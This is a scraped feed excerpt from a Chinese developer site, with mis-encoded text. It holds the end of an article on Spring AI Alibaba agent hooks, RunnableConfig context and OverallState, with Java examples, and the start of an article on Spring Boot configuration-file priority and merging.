<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”¨æˆ·ä½ç½®å·¥å…· - ä½¿ç”¨ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserLocationTool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BiFunction</span>&lt;String, ToolContext, String&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">apply</span><span class="hljs-params">(
        <span class="hljs-meta">@ToolParam(description = "User query")</span> String query,
        ToolContext toolContext)</span> {
        <span class="hljs-comment">// ä»ä¸Šä¸‹æ–‡ä¸­è·å–ç”¨æˆ·ä¿¡æ¯</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
        <span class="hljs-keyword">if</span> (toolContext != <span class="hljs-literal">null</span> &amp;&amp; toolContext.getContext() != <span class="hljs-literal">null</span>) {
			<span class="hljs-type">RunnableConfig</span> <span class="hljs-variable">runnableConfig</span> <span class="hljs-operator">=</span> (RunnableConfig) toolContext.getContext().get(AGENT_CONFIG_CONTEXT_KEY);
			Optional&lt;Object&gt; userIdObjOptional = runnableConfig.metadata(<span class="hljs-string">"user_id"</span>);
			<span class="hljs-keyword">if</span> (userIdObjOptional.isPresent()) {
				userId = (String) userIdObjOptional.get();
			}
		}
		<span class="hljs-keyword">if</span> (userId == <span class="hljs-literal">null</span>) {
			userId = <span class="hljs-string">"1"</span>;
		}
        <span class="hljs-keyword">return</span> <span class="hljs-string">"1"</span>.equals(userId) ? <span class="hljs-string">"Florida"</span> : <span class="hljs-string">"San Francisco"</span>;
    }
}
</code></pre>
<p><code>RunnableConfig</code>Â æä¾›äº†ä¸€ä¸ªÂ <code>context()</code>Â æ–¹æ³•ï¼Œå…è®¸ä½ åœ¨åŒä¸€ä¸ªæ‰§è¡Œæµç¨‹ä¸­çš„å¤šä¸ª Hook è°ƒç”¨ã€å¤šè½®æ¨¡å‹æˆ–å·¥å…·è°ƒç”¨ä¹‹é—´å…±äº«æ•°æ®ã€‚è¿™å¯¹äºå®ç°è®¡æ•°å™¨ã€ç´¯ç§¯ç»Ÿè®¡ä¿¡æ¯æˆ–è·¨å¤šæ¬¡è°ƒç”¨ç»´æŠ¤çŠ¶æ€éå¸¸æœ‰ç”¨ã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<ul>
<li>è·Ÿè¸ªæ¨¡å‹æˆ–å·¥å…·è°ƒç”¨æ¬¡æ•°</li>
<li>ç´¯ç§¯æ€§èƒ½æŒ‡æ ‡ï¼ˆæ€»è€—æ—¶ã€å¹³å‡å“åº”æ—¶é—´ç­‰ï¼‰</li>
<li>åœ¨ before/after Hook ä¹‹é—´ä¼ é€’ä¸´æ—¶æ•°æ®</li>
<li>å®ç°åŸºäºè®¡æ•°çš„é™æµæˆ–æ–­è·¯å™¨</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨ RunnableConfig.context() å®ç°è°ƒç”¨è®¡æ•°å™¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@HookPositions({HookPosition.BEFORE_MODEL, HookPosition.AFTER_MODEL})</span>  
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ModelCallCounterHook</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ModelHook</span> {  
  
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CALL_COUNT_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"__model_call_count__"</span>;  
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOTAL_TIME_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"__total_model_time__"</span>;  
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">START_TIME_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">"__call_start_time__"</span>;  
  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {  
<span class="hljs-keyword">return</span> <span class="hljs-string">"model_call_counter"</span>;  
}  
  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">beforeModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {  
<span class="hljs-comment">// ä» context è¯»å–å½“å‰è®¡æ•°ï¼ˆå¦‚æœä¸å­˜åœ¨åˆ™é»˜è®¤ä¸º 0ï¼‰  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> config.context().containsKey(CALL_COUNT_KEY)  
? (<span class="hljs-type">int</span>) config.context().get(CALL_COUNT_KEY) : <span class="hljs-number">0</span>;  
  
System.out.println(<span class="hljs-string">"æ¨¡å‹è°ƒç”¨ #"</span> + (currentCount + <span class="hljs-number">1</span>));  
  
<span class="hljs-comment">// è®°å½•å¼€å§‹æ—¶é—´  </span>
config.context().put(START_TIME_KEY, System.currentTimeMillis());  
  
<span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of());  
}  
  
<span class="hljs-meta">@Override</span>  
<span class="hljs-keyword">public</span> CompletableFuture&lt;Map&lt;String, Object&gt;&gt; <span class="hljs-title function_">afterModel</span><span class="hljs-params">(OverAllState state, RunnableConfig config)</span> {  
<span class="hljs-comment">// è¯»å–å½“å‰è®¡æ•°å¹¶é€’å¢  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">currentCount</span> <span class="hljs-operator">=</span> config.context().containsKey(CALL_COUNT_KEY)  
? (<span class="hljs-type">int</span>) config.context().get(CALL_COUNT_KEY) : <span class="hljs-number">0</span>;  
config.context().put(CALL_COUNT_KEY, currentCount + <span class="hljs-number">1</span>);  
  
<span class="hljs-comment">// è®¡ç®—æœ¬æ¬¡è°ƒç”¨è€—æ—¶å¹¶ç´¯åŠ åˆ°æ€»è€—æ—¶  </span>
<span class="hljs-keyword">if</span> (config.context().containsKey(START_TIME_KEY)) {  
<span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-type">long</span>) config.context().get(START_TIME_KEY);  
<span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - startTime;  
  
<span class="hljs-type">long</span> <span class="hljs-variable">totalTime</span> <span class="hljs-operator">=</span> config.context().containsKey(TOTAL_TIME_KEY)  
? (<span class="hljs-type">long</span>) config.context().get(TOTAL_TIME_KEY) : <span class="hljs-number">0L</span>;  
config.context().put(TOTAL_TIME_KEY, totalTime + duration);  
  
<span class="hljs-comment">// è¾“å‡ºç»Ÿè®¡ä¿¡æ¯  </span>
<span class="hljs-type">int</span> <span class="hljs-variable">newCount</span> <span class="hljs-operator">=</span> currentCount + <span class="hljs-number">1</span>;  
<span class="hljs-type">long</span> <span class="hljs-variable">newTotalTime</span> <span class="hljs-operator">=</span> totalTime + duration;  
System.out.println(<span class="hljs-string">"æ¨¡å‹è°ƒç”¨å®Œæˆ: "</span> + duration + <span class="hljs-string">"ms"</span>);  
System.out.println(<span class="hljs-string">"ç´¯è®¡ç»Ÿè®¡ - è°ƒç”¨æ¬¡æ•°: "</span> + newCount + <span class="hljs-string">", æ€»è€—æ—¶: "</span> + newTotalTime + <span class="hljs-string">"ms, å¹³å‡: "</span> + (newTotalTime / newCount) + <span class="hljs-string">"ms"</span>);  
}  
  
<span class="hljs-keyword">return</span> CompletableFuture.completedFuture(Map.of());  
}  
}
</code></pre>
<h2 data-id="heading-7">OverallState (å…¨å±€çŠ¶æ€/ä¸Šä¸‹æ–‡)</h2>
<p><code>OverallState</code> é€šå¸¸ä¸æ˜¯ Spring AI æ¡†æ¶å†…çš„ä¸€ä¸ªå›ºå®šç±»åï¼ˆä¸åƒ <code>RunnableConfig</code> å±äºæ ¸å¿ƒæ¥å£ï¼‰ï¼Œå®ƒé€šå¸¸æ˜¯å¼€å‘è€…åœ¨æ„å»º <strong>åŸºäºå›¾ï¼ˆGraph-basedï¼‰</strong> æˆ– <strong>çŠ¶æ€æœºï¼ˆStatefulï¼‰</strong> çš„ Agent æ—¶è‡ªå®šä¹‰çš„ä¸€ä¸ªç±»ã€‚</p>
<p>åœ¨ Spring AI Alibaba çš„é«˜çº§åº”ç”¨ï¼ˆå¦‚ä»¿ç…§ LangGraph çš„æ¨¡å¼ï¼‰ä¸­ï¼ŒAgent çš„æ‰§è¡Œè¿‡ç¨‹è¢«è§†ä¸ºä¸€ç³»åˆ—èŠ‚ç‚¹çš„æµè½¬ã€‚<code>OverallState</code> å°±æ˜¯åœ¨è¿™äº›èŠ‚ç‚¹ä¹‹é—´ä¼ é€’çš„<strong>å…±äº«å†…å­˜å¯¹è±¡</strong>ã€‚</p>
<p>å®ƒä¸€èˆ¬åŒ…å«çš„å°±æ˜¯åº”ç”¨çš„ä¸šåŠ¡æ•°æ®ã€‚</p>
<h3 data-id="heading-8">æ ¸å¿ƒä½œç”¨ï¼š</h3>
<ol>
<li>
<p><strong>ç»Ÿä¸€çš„æ•°æ®æ€»çº¿</strong>ï¼š</p>
<ul>
<li>æ‰€æœ‰çš„èŠ‚ç‚¹ï¼ˆNodeï¼‰éƒ½ä» <code>OverallState</code> è¯»å–æ•°æ®ï¼Œå¤„ç†å®Œåå°†ç»“æœå†™å› <code>OverallState</code>ã€‚</li>
</ul>
</li>
<li>
<p><strong>è®°å¿†ç®¡ç† (Memory)</strong> ï¼š</p>
<ul>
<li>
<p>å®ƒé€šå¸¸åŒ…å«ï¼š</p>
<ul>
<li><code>input</code>ï¼šç”¨æˆ·çš„åŸå§‹é—®é¢˜ã€‚</li>
<li><code>chat_history</code>ï¼šå¯¹è¯çš„å†å²æ¶ˆæ¯åˆ—è¡¨ã€‚</li>
<li><code>intermediate_steps</code>ï¼šAgent çš„ä¸­é—´æ€è€ƒè¿‡ç¨‹æˆ–å·¥å…·è°ƒç”¨ç»“æœã€‚</li>
<li><code>output</code>ï¼šæœ€ç»ˆç”Ÿæˆçš„ç­”æ¡ˆã€‚</li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>çŠ¶æ€æµè½¬</strong>ï¼š</p>
<ul>
<li>åœ¨ Spring AI Alibaba å¯¹æ¥ Qwenï¼ˆé€šä¹‰åƒé—®ï¼‰æ—¶ï¼Œæ¨¡å‹ç”Ÿæˆçš„å›å¤ä¼šæ›´æ–°åˆ° State ä¸­ï¼Œä¸‹ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ¯”å¦‚å·¥å…·æ‰§è¡ŒèŠ‚ç‚¹ï¼‰ä¼šè¯»å– State ä¸­çš„æ¨¡å‹æŒ‡ä»¤å»æ‰§è¡Œå·¥å…·ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-9">å·¥ä½œæµ</h3>
<p>ä¸‹é¢æˆ‘ç»™å‡ºä¸€ä¸ªç¤ºä¾‹å·¥ä½œæµã€‚</p>
<ul>
<li>
<p><strong>Start</strong> -&gt; ä¼ å…¥åˆå§‹ <code>OverallState</code>ï¼ˆåŒ…å«ç”¨æˆ·é—®é¢˜ï¼‰ã€‚</p>
</li>
<li>
<p><strong>LLM Node</strong> -&gt; è¯»å– Stateï¼Œè°ƒç”¨ Qwen æ¨¡å‹ï¼Œå°†æ¨¡å‹çš„å›å¤ï¼ˆæ¯”å¦‚â€œå»è°ƒç”¨å¤©æ°”APIâ€ï¼‰å†™å…¥ Stateã€‚</p>
</li>
<li>
<p><strong>Tool Node</strong> -&gt; æ£€æµ‹åˆ° State é‡Œæœ‰è°ƒç”¨è¯·æ±‚ï¼Œæ‰§è¡Œå¤©æ°” APIï¼Œå°†ç»“æœâ€œ25åº¦â€å†™å…¥ Stateã€‚</p>
</li>
<li>
<p><strong>LLM Node</strong> -&gt; å†æ¬¡è¯»å– Stateï¼ˆåŒ…å«é—®é¢˜+å·¥å…·ç»“æœï¼‰ï¼Œç”Ÿæˆæœ€ç»ˆå›ç­”â€œä»Šå¤©25åº¦â€ï¼Œå†™å…¥ Stateã€‚</p>
</li>
<li>
<p><strong>End</strong> -&gt; è¿”å› State ä¸­çš„æœ€ç»ˆå›ç­”ã€‚</p>
</li>
</ul>
<h2 data-id="heading-10">æ€»ç»“å¯¹æ¯”</h2>






























<table><thead><tr><th><strong>ç‰¹æ€§</strong></th><th><strong>RunnableConfig</strong></th><th><strong>OverallState (è‡ªå®šä¹‰çŠ¶æ€)</strong></th></tr></thead><tbody><tr><td><strong>å…³æ³¨ç‚¹</strong></td><td><strong>è¿‡ç¨‹æ§åˆ¶</strong> (Process Control)</td><td><strong>ä¸šåŠ¡æ•°æ®</strong> (Business Data)</td></tr><tr><td><strong>å†…å®¹ç¤ºä¾‹</strong></td><td>é€’å½’é™åˆ¶ã€å›è°ƒå‡½æ•°ã€å…ƒæ•°æ®ã€æ ‡ç­¾</td><td>ç”¨æˆ·é—®é¢˜ã€LLM å›å¤ã€å·¥å…·ç»“æœã€æ•°æ®åº“æŸ¥è¯¢å€¼</td></tr><tr><td><strong>å¯å˜æ€§</strong></td><td>é€šå¸¸åœ¨è¿è¡Œå¼€å§‹æ—¶è®¾å®šï¼Œä¼ é€’è¿‡ç¨‹ä¸­è¾ƒå°‘ä¿®æ”¹</td><td>åœ¨æ¯ä¸ªæ­¥éª¤ï¼ˆNodeï¼‰ä¸­ä¸æ–­è¢«è¯»å–å’Œä¿®æ”¹ï¼ˆç´¯åŠ ä¿¡æ¯ï¼‰</td></tr><tr><td><strong>ç±»æ¯”</strong></td><td><strong>äº¤é€šè§„åˆ™ä¸ä¿¡å·ç¯</strong>ï¼ˆçº¢ç»¿ç¯ã€é™é€Ÿï¼‰</td><td><strong>è´§è½¦ä¸Šçš„è´§ç‰©</strong>ï¼ˆæ¯ä¸€ç«™å¯èƒ½ä¼šè£…å¸è´§ç‰©ï¼‰</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot é…ç½®æ–‡ä»¶åŠ è½½å¤§æ­ç§˜ï¼šä¼˜å…ˆçº§è¦†ç›–ä¸äº’è¡¥åˆå¹¶æœºåˆ¶è¯¦è§£]]></title>    <link>https://juejin.cn/post/7592572266754342975</link>    <guid>https://juejin.cn/post/7592572266754342975</guid>    <pubDate>2026-01-08T08:22:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592572266754342975" data-draft-id="7592637149696655395" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot é…ç½®æ–‡ä»¶åŠ è½½å¤§æ­ç§˜ï¼šä¼˜å…ˆçº§è¦†ç›–ä¸äº’è¡¥åˆå¹¶æœºåˆ¶è¯¦è§£"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-01-08T08:22:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·030480591263"/> <meta itemprop="url" content="https://juejin.cn/user/3793762867478852"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot é…ç½®æ–‡ä»¶åŠ è½½å¤§æ­ç§˜ï¼šä¼˜å…ˆçº§è¦†ç›–ä¸äº’è¡¥åˆå¹¶æœºåˆ¶è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3793762867478852/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·030480591263
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T08:22:28.000Z" title="Thu Jan 08 2026 08:22:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ Spring Boot é¡¹ç›®çš„éƒ¨ç½²è¿ç»´ä¸­ï¼ˆå°¤å…¶æ˜¯ä½¿ç”¨ <code>java -jar</code> å¯åŠ¨æ—¶ï¼‰ï¼Œé…ç½®æ–‡ä»¶çš„åŠ è½½é€»è¾‘å¸¸å¸¸è®©äººæ„Ÿåˆ°å›°æƒ‘ï¼š</p>
<blockquote>
<p>â€œå¦‚æœæˆ‘åœ¨ jar åŒ…æ—è¾¹æ”¾äº†é…ç½®æ–‡ä»¶ï¼Œconfig ç›®å½•ä¸‹ä¹Ÿæ”¾äº†ä¸€ä¸ªï¼Œjar åŒ…é‡Œè¿˜æœ‰ä¸€ä¸ªï¼Œåˆ°åº•è°ç”Ÿæ•ˆï¼Ÿâ€
â€œå¤–éƒ¨é…ç½®æ–‡ä»¶æ˜¯ä¼šæŠŠå†…éƒ¨çš„å®Œå…¨æ›¿æ¢æ‰å—ï¼Ÿâ€</p>
</blockquote>
<p>ä»Šå¤©æˆ‘ä»¬å°±é€šè¿‡ä¸€ç¯‡æ–‡ç« ï¼Œå½»åº•è®²é€ Spring Boot é…ç½®æ–‡ä»¶çš„ <strong>â€œä¼˜å…ˆçº§è¦†ç›–â€</strong> ä¸ <strong>â€œäº’è¡¥åˆå¹¶â€</strong> ä¸¤å¤§æ ¸å¿ƒæœºåˆ¶ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ æ ¸å¿ƒæœºåˆ¶å›¾è§£</h2>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬è¦å»ºç«‹ä¸€ä¸ªæ¦‚å¿µï¼šSpring Boot è¯»å–é…ç½®ï¼Œ<strong>ä¸æ˜¯â€œéé»‘å³ç™½â€çš„æ–‡ä»¶æ›¿æ¢ï¼Œè€Œæ˜¯ç±»ä¼¼â€œåƒå±‚é¥¼â€æˆ–â€œPSå›¾å±‚â€çš„å åŠ ã€‚</strong></p>
<p>å®ƒéµå¾ªä¸¤ä¸ªåŸåˆ™ï¼š</p>
<ol>
<li><strong>ä¼˜å…ˆçº§ï¼ˆPriorityï¼‰ï¼š</strong> å†³å®šè°è¯´äº†ç®—ï¼ˆé‡åˆ°å†²çªï¼Œå¬é«˜ä¼˜å…ˆçº§çš„ï¼‰ã€‚</li>
<li><strong>äº’è¡¥åˆå¹¶ï¼ˆMergeï¼‰ï¼š</strong> å†³å®šå¦‚ä½•å…±å­˜ï¼ˆæ²¡å†²çªçš„ï¼Œå¤§å®¶ä¸€èµ·ç”Ÿæ•ˆï¼‰ã€‚</li>
</ol>
<h2 data-id="heading-1">äºŒã€ ä¼˜å…ˆçº§æ¢¯é˜Ÿï¼ˆè°æ˜¯è€å¤§ï¼Ÿï¼‰</h2>
<p>å½“ç¨‹åºå¯åŠ¨æ—¶ï¼ŒSpring Boot ä¼šæŒ‰ç…§ä»¥ä¸‹é¡ºåºæ‰«æé…ç½®æ–‡ä»¶ï¼Œ<strong>ä¼˜å…ˆçº§ä»é«˜åˆ°ä½</strong>ï¼š</p>
<ol>
<li><strong>å‘½ä»¤è¡Œå‚æ•°</strong> <code>(æœ€é«˜)</code>
<ul>
<li><code>java -jar app.jar --server.port=9999</code></li>
<li><em>è¯´æ˜ï¼š</em> ä¸€ç¥¨å¦å†³æƒï¼Œé€šå¸¸ç”¨äºä¸´æ—¶æ•‘æ€¥ã€‚</li>
</ul>
</li>
<li><strong>è¿è¡Œç›®å½•ä¸‹çš„ config å­ç›®å½•</strong>
<ul>
<li><code>file:./config/application.yml</code></li>
<li><em>è¯´æ˜ï¼š</em> å¤–éƒ¨é…ç½®çš„ç‹è€…ï¼Œä¼˜å…ˆçº§é«˜äºæ ¹ç›®å½•ã€‚</li>
</ul>
</li>
<li><strong>è¿è¡Œç›®å½•ï¼ˆJar åŒ…åŒçº§ç›®å½•ï¼‰</strong>
<ul>
<li><code>file:./application.yml</code></li>
<li><em>è¯´æ˜ï¼š</em> æœ€å¸¸ç”¨çš„ç”Ÿäº§ç¯å¢ƒé…ç½®ä½ç½®ã€‚</li>
</ul>
</li>
<li><strong>Classpath å†…éƒ¨</strong> <code>(æœ€ä½/ä¿åº•)</code>
<ul>
<li><code>classpath:/application.yml</code></li>
<li><em>è¯´æ˜ï¼š</em> æ‰“åŒ…åœ¨ Jar åŒ…é‡Œçš„é»˜è®¤é…ç½®ï¼ˆå¼€å‘æ—¶å†™çš„ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€ äº’è¡¥åˆå¹¶æœºåˆ¶ï¼ˆå¦‚ä½•å…±å­˜ï¼Ÿï¼‰</h2>
<p>è¿™æ˜¯å¾ˆå¤šæ–°æ‰‹å®¹æ˜“è¯¯è§£çš„åœ°æ–¹ã€‚</p>
<p><strong>å¤–éƒ¨é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼Œå¹¶ä¸ä»£è¡¨å†…éƒ¨é…ç½®æ–‡ä»¶â€œå¤±æ•ˆâ€æˆ–â€œè¢«ä¸¢å¼ƒâ€ï¼</strong>
Spring Boot ä¼šæŠŠæ‰€æœ‰æ‰«æåˆ°çš„é…ç½®æ–‡ä»¶<strong>åŠ è½½è¿›å†…å­˜è¿›è¡Œåˆå¹¶</strong>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆ <strong>Photoshop çš„å›¾å±‚å åŠ </strong>ï¼š</p>
<ul>
<li>é«˜ä¼˜å…ˆçº§çš„é…ç½®åœ¨<strong>ä¸Šå±‚</strong>ã€‚</li>
<li>ä½ä¼˜å…ˆçº§çš„é…ç½®åœ¨<strong>ä¸‹å±‚</strong>ã€‚</li>
<li>å¦‚æœä¸Šå±‚æ²¡æœ‰è®¾ç½®æŸä¸ªå€¼ï¼ˆé€æ˜ï¼‰ï¼Œå°±ä¼šé€è¿‡ä¸Šå±‚çœ‹åˆ°ä¸‹å±‚çš„å€¼ã€‚</li>
</ul>
<h3 data-id="heading-3">å åŠ è§„åˆ™çš„ä¸‰å¤§å®šå¾‹ï¼š</h3>
<ol>
<li><strong>å†²çªè¦†ç›–ï¼ˆOverrideï¼‰ï¼š</strong> Key ç›¸åŒï¼Œé«˜ä¼˜å…ˆçº§è¦†ç›–ä½ä¼˜å…ˆçº§ã€‚</li>
<li><strong>ç¼ºçœä¿ç•™ï¼ˆRetainï¼‰ï¼š</strong> Key ä»…åœ¨ä½ä¼˜å…ˆçº§å­˜åœ¨ï¼Œä¼šè¢«ä¿ç•™ã€‚</li>
<li><strong>å¢é‡è¿½åŠ ï¼ˆAddï¼‰ï¼š</strong> Key ä»…åœ¨é«˜ä¼˜å…ˆçº§å­˜åœ¨ï¼Œä¼šè¢«è¿½åŠ ã€‚</li>
</ol>
<hr/>
<h2 data-id="heading-4">å››ã€ ç»ˆæå®æˆ˜æ¼”ç»ƒ</h2>
<p>ä¸ºäº†å½»åº•çœ‹æ‡‚ï¼Œæˆ‘ä»¬å‡è®¾æœ‰ä¸‰ä¸ªé…ç½®æ–‡ä»¶åŒæ—¶å­˜åœ¨ï¼š</p>
<h4 data-id="heading-5">1. å±‚çº§æœ€ä½ï¼šJar åŒ…å†…éƒ¨ (<code>classpath</code>)</h4>
<p>è¿™æ˜¯å¼€å‘æ—¶çš„å…¨é‡é…ç½®ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">server:</span>
